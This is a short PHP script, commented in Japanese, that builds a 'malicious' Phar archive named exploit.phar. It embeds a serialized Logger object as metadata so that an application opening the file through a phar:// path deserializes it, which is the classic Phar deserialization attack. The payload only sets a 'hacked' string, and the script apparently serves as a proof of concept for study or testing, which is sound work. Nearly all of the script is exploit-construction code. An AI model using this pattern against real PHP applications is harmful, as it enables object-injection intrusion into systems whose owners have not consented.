<?php
//// 悪意のあるPharファイルを生成する

// 悪意のあるオブジェクト
class Logger
{
    public function __construct()
    {
        $this->content = 'hacked!!!!!!';
    }
}

// 引数はファイル名
$phar = new \Phar('Phar/exploit.phar');
// Pharの書き込み操作のバッファリングを開始
$phar->startBuffering();
// PharアーカイブのPHPローダ(あるいは起動スタブ)を設定する
$phar->setStub("<?php __HALT_COMPILER(); ?>");
// serializationを始める
$payload = new Logger();
// メタデータをセット。Pharファイルにおいてグローバルな情報の保存に使用。
$phar->setMetadata($payload);
// hogehogehogeという中身のhoge.txtというファイルをpharアーカイブに追加する
$phar->addFromString('hoge.txt', 'hogehogehoge');
// Pharの書き込み操作のバッファリングを終了
$phar->stopBuffering();
